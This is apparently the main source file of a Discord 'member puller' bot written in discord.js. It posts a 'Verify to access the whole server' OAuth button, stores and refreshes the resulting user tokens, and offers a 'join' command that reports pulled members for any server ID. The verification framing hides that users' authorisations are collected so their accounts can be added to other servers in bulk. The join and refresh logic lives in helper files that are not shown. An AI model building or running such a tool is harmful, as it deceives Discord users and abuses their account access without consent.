const config = require('../config/config.json')
const secrets = require('../config/secrets')
const functions = require('../functions/function')

const database = require('../database/schema')

const { Client, GatewayIntentBits, ActivityType, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js')
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildPresences,
        GatewayIntentBits.MessageContent
    ]
})

client.on('ready', async () => {
    let data = await database.findOne({ id: "1" });
    if (!data) data = new database({ id: "1" });
    const verified = data.data.length
    client.user.setPresence({
        activities: [{ name: `${verified} verified users.`, type: ActivityType.Watching }],
        status: 'idle',
    })
    console.log(`${client.user.username} is started and watching to ${verified} verified users`)
})

client.on('messageCreate', async (message) => {
    if (!message.guild) return;
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) return;
    if (!config.owners.includes(message.author.id)) return;

    let args = message.content.slice(config.prefix.length).split(" ")
    if (args == '') return;

    const cmd = args[0]
    args = args.splice(1)

    if (cmd === 'help') {

        message.channel.send(`\`\`\`\nCommands:\n help\n all\n verify\n join\n clean\n refresh\n\nType .help command for more info on a command.\n\`\`\``)

    } else if (cmd === 'user') {

        if (!args[0]) return message.channel.send({ embeds: [{ description: `Wrong usage: Specify user to check` }] })

        let datab = await database.findOne({ id: "1" });
        if (!datab) datab = new database({ id: "1" });

        let data = await datab.data.find((x) => x.user_id === args[0])
        if (data) {
            const embed = new EmbedBuilder()
                .setDescription(`**The user is available in our database**`)
                .setColor(`#00FF00`)
            message.channel.send({ embeds: [embed] })
        } else {
            const embed = new EmbedBuilder()
                .setDescription(`**The user is not available in our database**`)
                .setColor(`#FF0000`)
            message.channel.send({ embeds: [embed] })
        }

    } else if (cmd === 'clean') {

        await functions.clean(message)

    } else if (cmd === 'refresh') {

        await functions.refreshTokens(message)

    } else if (cmd === 'all') {

        const users = await functions.tokenCount()
        message.channel.send({
            embeds: [{
                title: `Total Authorised Members`,
                description: `**We have ${users} member in database**`
            }]
        })

    } else if (cmd === 'verify') {

        const button = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setURL(config.oauth_url)
                    .setLabel('Authorize')
                    .setStyle(ButtonStyle.Link)
            )
        const embed = new EmbedBuilder()
            .setAuthor({ name: `${config.shop_name}\'s Oauth` })
            .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
            .setDescription(`Verify to access the whole server`)

        message.channel.send({ embeds: [embed], components: [button] })

    } else if (cmd === 'join') {

        if (!args[0] || !args[1]) return message.channel.send("Wrong usage, `join <server id> <number of join>`")
        const count = await functions.manageJoin({
            amount: args[1],
            guild_id: args[0]
        });
        message.channel.send({
            embeds: [{
                title: "Successfully Pulled Members",
                description: `**Pulled: ${count}**\n**Missed ${args[1] - count}**`
            }]
        });

    } else return;

})

client.login(secrets.bot_token)
